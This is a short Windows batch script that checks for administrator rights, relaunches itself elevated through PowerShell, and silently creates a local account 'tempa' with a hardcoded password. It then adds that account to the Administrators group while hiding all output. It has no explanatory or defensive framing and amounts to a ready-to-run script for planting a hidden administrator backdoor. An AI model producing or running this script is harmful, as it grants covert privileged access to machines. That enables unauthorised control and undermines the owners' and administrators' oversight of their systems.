
@echo off
:: Hide output
cls

:: Check for admin rights
net session >nul 2>&1
if %errorlevel% neq 0 (
    :: Relaunch with elevation if not admin
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Create user silently
net user tempa P@ssw0rd123 /add >nul 2>&1
net localgroup Administrators tempa /add >nul 2>&1

:: Optional: Log success
echo User
